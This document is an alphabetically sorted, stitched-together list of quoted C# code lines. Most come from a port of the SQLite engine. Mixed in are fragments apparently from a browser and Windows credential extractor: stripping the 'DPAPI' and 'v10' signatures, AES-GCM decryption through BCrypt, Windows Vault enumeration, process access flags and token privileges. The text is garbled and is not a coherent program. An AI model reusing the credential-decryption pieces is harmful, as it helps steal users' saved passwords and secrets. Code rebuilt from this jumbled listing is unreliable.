"              c2 = sqlite3Utf8Read( zPattern, ref zPattern )"
"              cacheX.iTable = sqlite3ExprCodeTemp( pParse, pX, ref regFree1 )"
"              case 'H': sqlite3_snprintf( 3, ref zTemp, ""%02d"", x.h )"
"              case 'M': sqlite3_snprintf( 3, ref zTemp, ""%02d"", x.m )"
"              case 'S': sqlite3_snprintf( 3, ref zTemp, ""%02d"", (int)x.s )"
"              case 'd': sqlite3_snprintf( 3, ref zTemp, ""%02d"", x.D )"
"              case 'm': sqlite3_snprintf( 3, ref zTemp, ""%02d"", x.M )"
"              char[] zOrd = ""thstndrd"".ToCharArray()"
"              checkRef(pCheck, iFreePage, zContext)"
"              codeInteger( v, pLeft, true, target )"
"              codeReal( v, pLeft.u.zToken, true, target )"
"              computeLimitRegisters( pParse, p, iBreak )"
"              corruptSchema( pData, argv[0], zErr )"
"              ctx.pFunc.xFunc( ctx, n, apVal )"
"              ctx.pFunc.xStep( ctx, n, apVal )"
"              database.  This is normally adequate protection, but"
"              dist = (int)(sqlite3Get4byte(aData, 8) - nearby)"
"              else rc = sqlite3BtreeClearTable( db.aDb[pOp.p2].pBt, pOp.p1, ref iDummy0 )"
"              for ( i = 0, j = 1 "
"              fprintf(yyTraceFILE, ""%sFALLBACK %s => %s"
"              freeEphemeralFunction( db, (FuncDef)p4 )"
"              freeEphemeralFunction( db, pVdbeFunc.pFunc )"
"              generateColumnNames( pParse, null, pFirst.pEList )"
"              i = putVarint32( zNewRecord, nHdr )"
"              iAddr = sqlite3VdbeAddOp1( v, OP_If, iMem )"
"              iDb = sqlite3SchemaToIndex( db, pIdx.pSchema )"
"              if ( ( zSql = zLeftover ) != """" )"
"              if ( Encoding.UTF8.GetString( (byte[])ap[vaNEXT - 1] ) == """
"              if ( c == '""' ) pNew.flags "
"              if ( pIn2.z != null ) pOut.z = pIn2.z.Substring( 0, pIn2.n ) "
"              if ( pOp.p3 != 0 ) rc = sqlite3BtreeClearTable( db.aDb[pOp.p2].pBt, pOp.p1, ref nChange )"
"              if ( parseHhMmSs( z2.Substring( z2Index ), tx ) != 0 ) break"
"              if ( sqlite3OsLock( pPager.fd, RESERVED_LOCK ) == SQLITE_OK )"
"              if ( sqlite3Select( pParse, pExpr.x.pSelect, ref dest ) != 0 )"
"              if ( sqlite3StrICmp( pCol.zName, zCol ) == 0 )"
"              if ( zLeft == ""page_count"" )"
"              if (iFrom == sqlite3Get4byte(pPage.aData, pCell, info.iOverflow))"
"              if (yygotominor.yy346.pExpr != null) sqlite3GetInt32(yymsp[0].minor.yy0.z.Substring(1), ref yygotominor.yy346.pExpr.iTable)"
"              inReg = sqlite3ExprCodeGetColumn( pParse, pExpr.pTab,"
"              int affLeft, affRight"
"              int iCont, iBreak, iStart"
"              int k = (int)va_arg( ap, ""int"" )"
"              int r1, r2, r3"
"              int x, y"
"              isnull = ( escarg == """" "
"              it is theoretically possible, though very unlikely,"
"              j1 = sqlite3VdbeAddOp1( v, OP_NotNull, regData "
"              j1 = sqlite3VdbeAddOp1( v, OP_NotNull, regRowid )"
"              j1 = sqlite3VdbeAddOp3( v, OP_HaltIfNull,"
"              j3 = sqlite3VdbeAddOp1( v, OP_MustBeInt, target )"
"              j4 = sqlite3VdbeAddOp3( v, OP_NotExists, pExpr.iTable, 0, target )"
"              j5 = sqlite3VdbeAddOp0( v, OP_Goto )"
"              j5 = sqlite3VdbeAddOp3( v, OP_Found, pExpr.iTable, 0, r2 )"
"              keyInfo.aColl[0] = sqlite3ExprCollSeq( pParse, pExpr.pLeft )"
"              nId, zId )"
"              new SelectQuery(""Select "
"              newMax = (int)sqlite3BtreeMaxPageCount( pBt, newMax )"
"              next character of the format string, instead of the next"
"              noContent = !btreeGetHasContent(pBt, pPgno) "
"              null, -1, dest, iCont, iBreak )"
"              p = sqlite3Expr(pParse.db, TK_COLUMN, null)"
"              p = sqlite3PExpr(pParse, TK_COLUMN, 0, 0, 0)"
"              pCol.iSorterColumn, target )"
"              pColl = multiSelectCollSeq( pParse, p, aPermute[i] )"
"              pCur = allocateCursor( p, pOp.p1, nField, iDb, 1 )"
"              pCx = allocateCursor( p, pOp.p1, pOp.p2, -1, 1 )"
"              pCx = allocateCursor( p, pOp.p1, pOp.p3, -1, 0 )"
"              pDef = sqlite3FindFunction( pParse.db, zId, nId, -1, enc, 0 )"
"              pDest.iMem = sqlite3GetTempRange( pParse, pIn.nMem )"
"              pDup = sqlite3ExprDup( db, pE, 0 )"
"              pEList.a[i].zSpan, SQLITE_DYNAMIC )"
"              pExpr.iColumn, pExpr.iTable, target,"
"              pKey = sqlite3IndexKeyinfo( pParse, pIdx )"
"              pKey, P4_KEYINFO_HANDOFF )"
"              pKeyInfo = sqlite3IndexKeyinfo( pParse, pBest )"
"              pList = sqlite3ExprListAppend(pParse, pList, yymsp[0].minor.yy346.pExpr)"
"              pMem.z = Encoding.UTF8.GetString( buf, 0, len )"
"              pMem.z = Encoding.UTF8.GetString( buf, offset, (int)len )"
"              pMinMax = sqlite3ExprListDup( db, p.pEList.a[0].pExpr.x.pList, 0 )"
"              pNew.pLeft = exprDup( db, p.pLeft, EXPRDUP_REDUCE, ref zAlloc )"
"              pNew.pLeft = sqlite3ExprDup( db, p.pLeft, 0 )"
"              pNew.pRight = exprDup( db, p.pRight, EXPRDUP_REDUCE, ref zAlloc )"
"              pNew.pRight = sqlite3ExprDup( db, p.pRight, 0 )"
"              pNew.x.pList = sqlite3ExprListDup( db, p.x.pList, isReduced "
"              pNew.x.pSelect = sqlite3SelectDup( db, p.x.pSelect, isReduced "
"              pPgno, closest "
"              pRight.iCursor, ref p.pWhere, isOuter )"
"              pRightTab, pRight.zAlias,"
"              pSrc = targetSrcList( pParse, pTriggerStep )"
"              pSubWInfo = sqlite3WhereBegin( pParse, oneTab, pOrTerm.pExpr, ref elDummy,"
"              pSubquery = sqlite3SelectNew(pParse, 0, yymsp[-4].minor.yy65, 0, 0, 0, 0, 0, 0, 0)"
"              pTab.zName, P4_STATIC )"
"              pTab.zName, pTab.aCol[i].zName )"
"              pTabList, 0, pColumn.a[i].zName )"
"              ptrmapPut(pBt, key, PTRMAP_BTREE, apNew[i].pgno, ref rc)"
"              pushOntoSorter( pParse, pOrderBy, p, r1 )"
"              pushOntoSorter( pParse, pOrderBy, p, regResult )"
"              put2byte(data, pc "
"              pzErrMsg = sqlite3MPrintf( db, ""unrecognized token: "
"              r1 = sqlite3GetTempRange( pParse, nFarg )"
"              r2 = sqlite3ExprCodeTemp( pParse, pExpr.pLeft, ref regFree2 )"
"              rc = accessPayload(pCur, 0, (u32)nCell, pCellKey, 0)"
"              rc = backupOnePage( p, iSrcPg, sqlite3PagerGetData( pSrcPg ) )"
"              rc = balance_nonroot(pParent, iIdx, pSpace, iPage == 1 "
"              rc = balance_quick(pParent, pPage, aBalanceQuickSpace)"
"              rc = btreeGetPage(pBt, iNewTrunk, ref pNewTrunk, 0)"
"              rc = btreeGetPage(pBt, pPgno, ref ppPage, noContent)"
"              rc = copyPayload(aPayload, offset "
"              rc = pager_error( pPager, rc )"
"              rc = sqlite3AnalysisLoad( db, pOp.p1 )"
"              rc = sqlite3BtreeCreateTable( pDb.pBt, ref pgno, flags )"
"              rc = sqlite3BtreeCursor( pX, p2, wrFlag, pKeyInfo, pCur.pCursor )"
"              rc = sqlite3BtreeFactory( db, null, true, SQLITE_DEFAULT_TEMP_CACHE_SIZE, openFlags,"
"              rc = sqlite3BtreeUpdateMeta( pDb.pBt, pOp.p2, (u32)pIn3.u.i )"
"              rc = sqlite3OsOpen( pVfs, pPager.zJournal, pPager.jfd, f, ref f )"
"              rc = sqlite3OsSync( pPager.jfd, pPager.sync_flags )"
"              rc = sqlite3OsWrite( pPager.jfd, pData2, pPager.pageSize,"
"              rc = sqlite3OsWrite( pPager.jfd, zerobyte, 1, iNextHdrOffset )"
"              rc = sqlite3PagerGet( pPager, i, ref pPage )"
"              rc = sqlite3PagerGet( pPager, pg, ref pPage )"
"              rc = sqlite3PagerPagecount( pPager, ref nPage )"
"              rc = sqlite3RunVacuum( ref p.zErrMsg, db )"
"              rc = sqlite3VdbeCloseStatement( p, SAVEPOINT_RELEASE )"
"              rc = sqlite3VdbeMemFinalize( pMem, pOp.p4.pFunc )"
"              rc = sqlite3_bind_blob( pStmt, i, pValue.z, pValue.n, SQLITE_TRANSIENT )"
"              rc = sqlite3_bind_zeroblob( pStmt, i, pValue.u.nZero )"
"              rc = write32bits( pPager.jfd, pPager.journalOff, (u32)cksum )"
"              rc2 = sqlite3BtreeSavepoint( pBt, SAVEPOINT_RELEASE, iSavepoint )"
"              rc2 = sqlite3BtreeSavepoint( pBt, SAVEPOINT_ROLLBACK, iSavepoint )"
"              res = sqlite3MemCompare( pIn3, pIn1, pOp.p4.pColl )"
"              resolveAlias( pParse, pEList, j, pExpr, """" )"
"              resolveOutOfRangeError( pParse, ""ORDER"", i "
"              returnSingleInt( pParse, p.zName, ( ( db.flags "
"              selectInnerLoop( pParse, p, p.pEList, unionTab, p.pEList.nExpr,"
"              signs, the same as  printf(""%.78c"",'-')."
"              single disk sector is atomic, then this mode provides"
"              sqlite3BtreeGetMeta( db.aDb[iDb].pBt, iCookie, ref iMeta )"
"              sqlite3BtreePrevious( pCrsr, ref res )"
"              sqlite3BtreeSetCachedRowid( pC.pCursor, 0 )"
"              sqlite3CodeVerifySchema( pParse, iDb )"
"              sqlite3ColumnDefault( v, pTab, i, -1 )"
"              sqlite3DeleteFrom( pParse, pSrc,"
"              sqlite3Error( db, SQLITE_ABORT, 0 )"
"              sqlite3ErrorMsg( pParse, ""aggregate functions are not allowed in "" "
"              sqlite3ErrorMsg( pParse, ""cannot join using column %s - column "" "
"              sqlite3ErrorMsg( pParse, ""misuse of aggregate function %."
"              sqlite3ErrorMsg( pParse, ""misuse of aggregate: %s()"", pExpr.u.zToken )"
"              sqlite3ErrorMsg( pParse, ""no such function: %."
"              sqlite3ErrorMsg( pParse, ""parameters prohibited in CHECK constraints"" )"
"              sqlite3ErrorMsg( pParse, ""table %S has no column named %s"","
"              sqlite3ErrorMsg( pParse, ""wrong number of arguments to function %."
"              sqlite3ErrorMsg( pParse,"
"              sqlite3ErrorMsg(pParse, ""near "
"              sqlite3ErrorMsg(pParse, ""too many arguments on function %T"", yymsp[-4].minor.yy0)"
"              sqlite3ExprCacheAffinityChange( pParse, pDest.iMem, nColumn )"
"              sqlite3ExprCacheAffinityChange( pParse, regResult, 1 )"
"              sqlite3ExprCacheAffinityChange( pParse, regResult, nColumn )"
"              sqlite3ExprCachePop( pParse, 1 )"
"              sqlite3ExprCode( pParse, aListelem[i "
"              sqlite3ExprCode( pParse, pExpr.pRight, target )"
"              sqlite3ExprCode( pParse, pGroupBy.a[j].pExpr, iBMem "
"              sqlite3ExprCode( pParse, pTab.aCol[i].pDflt, regData "
"              sqlite3ExprCodeAndCache( pParse, pChanges.a[j].pExpr, regCols "
"              sqlite3ExprCodeExprList( pParse, pFarg, r1, true )"
"              sqlite3ExprCodeMove( pParse, regResult, iParm, 1 )"
"              sqlite3ExprDelete( db, ref pDup )"
"              sqlite3ExprDup( db, pTriggerStep.pWhere, 0 ) )"
"              sqlite3ExprDup( db, pTriggerStep.pWhere, 0 ), orconf )"
"              sqlite3ExprIfFalse( pParse, pTest, nextCase, SQLITE_JUMPIFNULL )"
"              sqlite3ExprListDelete( db, ref pDel )"
"              sqlite3ExprListDelete(pParse.db, ref pList)"
"              sqlite3ExprListDelete(pParse.db, ref yymsp[-1].minor.yy14)"
"              sqlite3ExprListDelete(pParse.db, ref yymsp[-2].minor.yy14)"
"              sqlite3ExprListDup( db, pTriggerStep.pExprList, 0 ),"
"              sqlite3ExprSetColl(pParse, p, yymsp[-1].minor.yy0)"
"              sqlite3ExprSetHeight(pParse, p)"
"              sqlite3ExprSetHeight(pParse, yygotominor.yy346.pExpr)"
"              sqlite3GenerateRowDelete( pParse, pTab, baseCur, regR, 0 )"
"              sqlite3IdListDup( db, pTriggerStep.pIdList ), orconf )"
"              sqlite3Insert( pParse, pSrc,"
"              sqlite3OsDelete( pVfs, zMaster, 0 )"
"              sqlite3Parser( pEngine, tokenType, pParse.sLastToken, pParse )"
"              sqlite3Put4byte(aData, (u32)4, (k - 1))"
"              sqlite3Put4byte(pNewTrunk.aData, (u32)4, (u32)(k - 1))"
"              sqlite3Put4byte(pPage.aData, pCell, (int)iTo)"
"              sqlite3ReleaseTempRange( pParse, r1, nFarg )"
"              sqlite3ReleaseTempReg( pParse, r1 )"
"              sqlite3ReleaseTempReg( pParse, r2 )"
"              sqlite3RowSetInsert( pIdx.u.pRowSet, pVal.u.i )"
"              sqlite3SelectDelete(pParse.db, ref yymsp[-1].minor.yy3)"
"              sqlite3SelectDelete(pParse.db, ref yymsp[-2].minor.yy3)"
"              sqlite3SelectDestInit( dest, SRT_Set, pExpr.iTable )"
"              sqlite3SelectDup( db, pTriggerStep.pSelect, 0 ),"
"              sqlite3SrcListDelete(pParse.db, ref pSrc)"
"              sqlite3StrAccumAppend( errMsg,"
"              sqlite3StrAccumAppend( pAccum, pItem.zName, -1 )"
"              sqlite3StrAccumInit( errMsg, new StringBuilder( 200 ), 0, 200 )"
"              sqlite3UnlinkAndDeleteIndex( db, pOp.p1, pOp.p4.z )"
"              sqlite3UnlinkAndDeleteTable( db, pOp.p1, pOp.p4.z )"
"              sqlite3UnlinkAndDeleteTrigger( db, pOp.p1, pOp.p4.z )"
"              sqlite3Update( pParse, pSrc,"
"              sqlite3VdbeAddOp1( v, OP_Yield, pDest.iParm )"
"              sqlite3VdbeAddOp2( v, OP_Close, unionTab, 0 )"
"              sqlite3VdbeAddOp2( v, OP_ContextPop, 0, 0 )"
"              sqlite3VdbeAddOp2( v, OP_Expire, 0, 0 )"
"              sqlite3VdbeAddOp2( v, OP_Goto, 0, endLabel )"
"              sqlite3VdbeAddOp2( v, OP_Goto, 0, ignoreDest )"
"              sqlite3VdbeAddOp2( v, OP_Goto, 0, pParse.trigStack.ignoreJump )"
"              sqlite3VdbeAddOp2( v, OP_Goto, 0, pWInfo.iBreak )"
"              sqlite3VdbeAddOp2( v, OP_IdxInsert, iParm, r1 )"
"              sqlite3VdbeAddOp2( v, OP_Integer, 0, dest.iParm )"
"              sqlite3VdbeAddOp2( v, OP_Integer, 0, r1 )"
"              sqlite3VdbeAddOp2( v, OP_Integer, 0, target )"
"              sqlite3VdbeAddOp2( v, OP_Integer, 1, iMem )"
"              sqlite3VdbeAddOp2( v, OP_Integer, 1, target )"
"              sqlite3VdbeAddOp2( v, OP_IsNull, regData "
"              sqlite3VdbeAddOp2( v, OP_IsNull, regRowid, j1 "
"              sqlite3VdbeAddOp2( v, OP_NewRowid, iParm, r2 )"
"              sqlite3VdbeAddOp2( v, OP_Next, unionTab, iStart )"
"              sqlite3VdbeAddOp2( v, OP_Null, 0, dest.iParm )"
"              sqlite3VdbeAddOp2( v, OP_Null, 0, r2 )"
"              sqlite3VdbeAddOp2( v, OP_Null, 0, rMayHaveNull )"
"              sqlite3VdbeAddOp2( v, OP_Null, 0, target )"
"              sqlite3VdbeAddOp2( v, OP_Pagecount, iDb, iReg )"
"              sqlite3VdbeAddOp2( v, OP_ResetCount, 0, 0 )"
"              sqlite3VdbeAddOp2( v, OP_ResetCount, 1, 0 )"
"              sqlite3VdbeAddOp2( v, OP_ResultRow, iReg, 1 )"
"              sqlite3VdbeAddOp2( v, OP_ResultRow, pDest.iMem, nColumn )"
"              sqlite3VdbeAddOp2( v, OP_ResultRow, regResult, nColumn )"
"              sqlite3VdbeAddOp2( v, OP_Rewind, unionTab, iBreak )"
"              sqlite3VdbeAddOp2( v, OP_SCopy, inReg, target )"
"              sqlite3VdbeAddOp2( v, OP_VerifyCookie, iDb, pParse.cookieValue[iDb] )"
"              sqlite3VdbeAddOp3( v, OP_Column, iCur, i, regCols "
"              sqlite3VdbeAddOp3( v, OP_Column, pAggInfo.sortingIdx,"
"              sqlite3VdbeAddOp3( v, OP_Column, pseudoTab, i, pDest.iMem "
"              sqlite3VdbeAddOp3( v, OP_Column, sAggInfo.sortingIdx, j, iBMem "
"              sqlite3VdbeAddOp3( v, OP_Insert, iParm, r1, r2 )"
"              sqlite3VdbeAddOp3( v, OP_MakeRecord, regResult, nColumn, r1 )"
"              sqlite3VdbeAddOp3( v, OP_NewRowid, baseCur, regRowid, regAutoinc )"
"              sqlite3VdbeAddOp3( v, OP_Subtract, r2, r1, target )"
"              sqlite3VdbeAddOp3( v, OP_Variable, pExpr.iTable, target, 1 )"
"              sqlite3VdbeAddOp4( v, OP_CollSeq, 0, 0, 0, pColl, P4_COLLSEQ )"
"              sqlite3VdbeAddOp4( v, OP_Halt, SQLITE_CONSTRAINT, onError, 0, zErr, 0 )"
"              sqlite3VdbeAddOp4( v, OP_Halt, SQLITE_CONSTRAINT, pExpr.affinity, 0,"
"              sqlite3VdbeAddOp4( v, OP_MakeRecord, regResult, 1, r1, p.affinity, 1 )"
"              sqlite3VdbeAddOp4( v, OP_MakeRecord, target, 1, r2, affinity, 1 )"
"              sqlite3VdbeAddOp4( v, OP_OpenRead, iTab, pIdx.tnum, iDb,"
"              sqlite3VdbeChangeEncoding( ctx.s, encoding )"
"              sqlite3VdbeChangeEncoding( pIn1, encoding )"
"              sqlite3VdbeChangeEncoding( pMem, encoding )"
"              sqlite3VdbeChangeP4( v, -1, pKeyInfo, P4_KEYINFO_HANDOFF )"
"              sqlite3VdbeChangeP4( v, -1, zMsg, P4_DYNAMIC )"
"              sqlite3VdbeChangeP4( v, addr, keyInfo, P4_KEYINFO )"
"              sqlite3VdbeChangeP5( v, OPFLAG_APPEND )"
"              sqlite3VdbeDeleteAuxData( pVdbeFunc, 0 )"
"              sqlite3VdbeFreeCursor( p, p.apCsr[pOp.p1] )"
"              sqlite3VdbeJumpHere( v, addr )"
"              sqlite3VdbeJumpHere( v, iAddr )"
"              sqlite3VdbeJumpHere( v, j1 )"
"              sqlite3VdbeJumpHere( v, j3 )"
"              sqlite3VdbeJumpHere( v, j4 )"
"              sqlite3VdbeMemMove( ctx.s, pOut )"
"              sqlite3VdbeMemMove( pOut, ctx.s )"
"              sqlite3VdbeMemSetStr( pOut, pOp.p4.z, pOp.p1, 0, null )"
"              sqlite3VdbeMemShallowCopy( pOut, pIn1, MEM_Ephem )"
"              sqlite3VdbeResolveLabel( v, iBreak )"
"              sqlite3VdbeResolveLabel( v, iCont )"
"              sqlite3VdbeResolveLabel( v, nextCase )"
"              sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""page_count"", SQLITE_STATIC )"
"              sqlite3VdbeSetNumCols( v, 1 )"
"              sqlite3VdbeUsesBtree( v, iDb )"
"              sqlite3WalkSelect( pWalker, pExpr.x.pSelect )"
"              sqlite3_randomness( sizeof( i64 ), ref i64Temp )"
"              sqlite3_result_error( context, ""value of "" "
"              sqlite3_result_text( context, zText.ToString(), -1, SQLITE_TRANSIENT )"
"              sqlite3_result_text(context, z.ToString(), j, null)"
"              sqlite3_snprintf( nTemp, ref zTemp, ""%.16g"", pMem.r )"
"              sqlite3_snprintf( nTemp, ref zTemp, ""%lld"", pMem.u.i )"
"              statement, then this stores the column-names to be"
"              string escarg = (string)va_arg( ap, ""char"
"              sz = cellSizePtr(pParent, pCell)"
"              them to. See sqlite3Update() documentation of ""pChanges"""
"              u32 key = sqlite3Get4byte(apNew[i].aData, 8)"
"              yyTracePrompt, yyTokenName[iLookAhead], yyTokenName[iFallback])"
"              yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_REGISTER, 0, 0, yymsp[0].minor.yy0)"
"              yygotominor.yy346.pExpr.x.pSelect = sqlite3SelectNew(pParse, 0, pSrc, 0, 0, 0, 0, 0, 0, 0)"
"              yygotominor.yy65 = sqlite3SrcListAppendFromTerm(pParse, yymsp[-6].minor.yy65, 0, 0, yymsp[-2].minor.yy0, pSubquery, yymsp[-1].minor.yy132, yymsp[0].minor.yy408)"
"              z = sqlite3BtreeIntegrityCheck( db.aDb[pOp.p5].pBt, aRoot, nRoot,"
"              zMsg = sqlite3MPrintf( pParse.db, ""%s.%s may not be NULL"","
"              zText.Append( ""'"" )"
"              zType = ""TEXT"""
"              zWhere = sqlite3MPrintf( db, ""%s OR name=%Q"", zWhere, pTrig.name )"
"              zWhere = sqlite3MPrintf( db, ""name=%Q"", pTrig.name )"
"              {//, pItem"
"            "" text encoding as main database"" )"
"            ""CREATE TABLE %Q.sqlite_sequence(name,seq)"","
"            ""Corruption detected in cell %d on page %d"", i, iPage, 0)"
"            ""Multiple uses for byte %d of page %d"", i, iPage)"
"            ""an ON or USING clause"", """" )"
"            ""argument"" )"
"            ""date_added"": ""13236861887917624"","
"            ""freelist leaf count too big on page %d"", iPage)"
"            ""guid"": ""c5df2041-d745-4173-af39-b5c48f8d98a2"","
"            ""id"": ""5"","
"            ""name"": ""GitHub"","
"            ""qualified table names are not allowed on INSERT, UPDATE, and DELETE "" "
"            ""statements within triggers"")"
"            ""the INDEXED BY clause is not allowed on UPDATE or DELETE statements "" "
"            ""the NOT INDEXED clause is not allowed on UPDATE or DELETE statements "" "
"            ""type"": ""url"","
"            ""unknown column "
"            ""url"": ""https://github.com/"""
"            ""within triggers"")"
"            //                                  dwDummy,"
"            //                                  ref bytesPerSector,"
"            //     ref bytesPerSector,"
"            //     ref dwDummy,"
"            //  db,"
"            //  pParse.apVarExpr,"
"            //  sqlite3ExprDelete( db, ref pDup )"
"            //  zTemp = """""
"            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege."
"            // create new instance of DataTable with name ""resultTable"""
"            // if there is error, excetion is thrown"
"            // if there is some error, database pointer is set to 0 and exception is throws"
"            //Console.WriteLine("""
"            //Trim first 5 bytes. Its signature ""DPAPI"""
"            //dwRet = GetDiskFreeSpace( zConverted,"
"            //memcpy( zAlloc, p, nNewSize )"
"            //memcpy( zAlloc, p, nSize )"
"            //memset(pPg->pData, 0, pPager.pageSize)"
"            //sqlite3DbFree( db, p )"
"            //sqlite3DbFree( db, pInfo )"
"            //sqlite3DbFree( db, ref z )"
"            //sqlite3DbFree(db, p.zErrMsg )"
"            //sqlite3DbFree(db, zName)"
"            //trim first 3 bytes(signature ""v10"") and take 12 bytes after signature."
"            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr)"
"            1. A pointer to anything.  Same as the ""arg"" parameter."
"            All = 0x001F0FFF,"
"            AppStart = 100,"
"            Array.Clear( pPg.pData, 0, pPager.pageSize )"
"            Array.Copy(encryptedData, 3, iv, 0, 12)"
"            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5)"
"            Attribute = 11,"
"            Authenticator = 3,"
"            BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0)"
"            Boolean = 0,"
"            Buffer.BlockCopy( Encoding.UTF8.GetBytes( pMem.z ), 0, buf, offset, (int)len )"
"            Buffer.BlockCopy( pData, 24, pPager.dbFileVers, 0, pPager.dbFileVers.Length )"
"            Buffer.BlockCopy( pMem.zBLOB, 0, buf, offset, (int)len )"
"            Buffer.BlockCopy( zBytes, iz0, azChar[ii], 0, azChar[ii].Length )"
"            Buffer.BlockCopy(pCell, 0, _pCell_4, 4, pCell.Length)"
"            Buffer.BlockCopy(pCell, 0, pNew.aData, 8, 4)"
"            Buffer.BlockCopy(pOld.aData, 8, apCell[nCell], 0, 4)"
"            Buffer.BlockCopy(pOld.aData, iFOFC, apCell[nCell], 0, szCell[nCell])"
"            Buffer.BlockCopy(pTrunk.aData, 0, pPage1.aData, 32, 4)"
"            ByteArray = 8,"
"            CODEC2( pPager, pData, pPg.pgno, 7, SQLITE_NOMEM, ref pData2 )"
"            CSSQLite.sqlite3_exec( db, query, 0, 0, 0 )"
"            Console.WriteLine(""["
"            CreateProcess = 0x000000080,"
"            CreateThread = 0x00000002,"
"            Debug.Assert( !ExprHasProperty( p, EP_Reduced ) )"
"            Debug.Assert( !ExprHasProperty( pColExpr, EP_IntValue ) )"
"            Debug.Assert( !ExprHasProperty( pExpr, EP_IntValue ) )"
"            Debug.Assert( !ExprHasProperty( pExpr, EP_xIsSelect ) "
"            Debug.Assert( !ExprHasProperty( pExpr, EP_xIsSelect ) )"
"            Debug.Assert( !ExprHasProperty( pNew, EP_xIsSelect ) )"
"            Debug.Assert( ( x = (int)va_arg( ap, ""int"" ) ) != 0 )"
"            Debug.Assert( ExprHasProperty( pExpr, EP_xIsSelect ) )"
"            Debug.Assert( chngToIN == getMask( pMaskSet, iCursor ) )"
"            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>()"
"            Double = 5,"
"            DuplicateHandle = 0x00000040,"
"            Expr p = sqlite3Expr(pParse.db, TK_ALL, null)"
"            Expr p = yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_EXISTS, 0, 0, 0)"
"            Expr pDot = sqlite3PExpr(pParse, TK_DOT, pLeft, pRight, 0)"
"            Expr pLeft = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[-2].minor.yy0)"
"            Expr pLimit, pOffset"
"            Expr pNew = sqlite3Expr( db, TK_INTEGER, null )"
"            Expr pRight = sqlite3PExpr(pParse, TK_ALL, 0, 0, yymsp[0].minor.yy0)"
"            Expr temp1 = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[-2].minor.yy0)"
"            Expr temp1 = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[-4].minor.yy0)"
"            Expr temp2 = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[-2].minor.yy0)"
"            Expr temp2 = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[0].minor.yy0)"
"            Expr temp3 = sqlite3PExpr(pParse, TK_ID, 0, 0, yymsp[0].minor.yy0)"
"            Expr temp4 = sqlite3PExpr(pParse, TK_DOT, temp2, temp3, 0)"
"            ExprList pList = sqlite3ExprListAppend(pParse, 0, yymsp[-2].minor.yy346.pExpr)"
"            FileStream fs = File.Create( zTempFilename, 1, FileOptions.DeleteOnClose )"
"            Guid = 6,"
"            IOTRACE( ""CKVERS %p %d"
"            IOTRACE( ""JHDR %p %lld"
"            IOTRACE( ""JOUT %p %d %lld %d"
"            IOTRACE( ""JSYNC %p"
"            Identity = 2,"
"            Illegal = 0,"
"            Int = 3,"
"            IntPtr ClientToken,"
"            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM)"
"            IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey)"
"            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid)"
"            KeyInfo pKey = sqlite3IndexKeyinfo( pParse, pIdx )"
"            KeyInfo pKeyInfo = keyInfoFromExprList( pParse, pE.x.pList )"
"            LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED }"
"            MemSetTypeFlag( pRec, MEM_Int )"
"            OSTRACE2( ""could not get a PENDING lock. cnt=%d"
"            OSTRACE3( ""OPEN %d (%s)"
"            PAGERID( pPager ), pPg.pgno,"
"            PAGERTRACE( ""APPEND %d page %d needSync=%d"
"            PAGERTRACE( ""JOURNAL %d page %d needSync=%d hash(%08x)"
"            PAGERTRACE( ""SYNC journal of %d"
"            PRIVILEGE_SET privs = new PRIVILEGE_SET { Privilege = new LUID_AND_ATTRIBUTES[1], Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 }"
"            PTRMAP_ISPAGE(pBt, pgnoOvfl) "
"            PackageSid = 5,"
"            PgHdr pPage = pager_lookup( pPager, (u32)( pg1 "
"            ProtectedArray = 10,"
"            QueryInformation = 0x00000400,"
"            QueryLimitedInformation = 0x00001000,"
"            REGISTER_TRACE( p, pOp.p1, pIn1 )"
"            REGISTER_TRACE( p, pOp.p2, pIn2 )"
"            REGISTER_TRACE( p, pOp.p3, pIn3 )"
"            RegistryKey myreg = Key.OpenSubKey(""Software"
"            Resource = 1,"
"            SQLITE_SKIP_UTF8( zBytes, ref iz1 )"
"            SQLiteVdbe statement = new SQLiteVdbe(this, query)"
"            SelectDest dest = new SelectDest(SRT_Output, '"
"            SetInformation = 0x00000200,"
"            SetQuota = 0x00000100,"
"            Short = 1,"
"            Sid = 12,"
"            SrcList pSrc = sqlite3SrcListAppend(pParse.db, 0, yymsp[-1].minor.yy0, yymsp[0].minor.yy0)"
"            String = 7,"
"            String columnName = """""
"            String query = ""SELECT name FROM sqlite_master "" "
"            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[1] }"
"            TRACE(""ALLOCATE: %d trunk - %d free pages left"
"            Tag = 4,"
"            Terminate = 0x00000001,"
"            TimeStamp = 9,"
"            Token one = new Token( ""1"", 1 )"
"            Undefined = -1,"
"            UnsignedInt = 4,"
"            UnsignedShort = 2,"
"            VdbeComment( v, ""GROUP BY sort"" )"
"            VdbeComment( v, ""end IN expr r%d"", target )"
"            VdbeNoopComment( v, ""begin IN expr r%d"", target )"
"            VirtualMemoryOperation = 0x00000008,"
"            VirtualMemoryRead = 0x00000010,"
"            VirtualMemoryWrite = 0x00000020,"
"            WHERETRACE( ""... Multi-index OR testing for term %d of %d...."
"            WHERETRACE( ""... best is rowid"
"            WHERETRACE( ""... sorting increases OR cost to %.9g"
"            WHERETRACE( ""... sorting increases cost to %.9g"
"            WHERETRACE( ""...... idx-only reduces cost to %.9g"
"            WHERETRACE( ""...... orderby increases cost to %.9g"
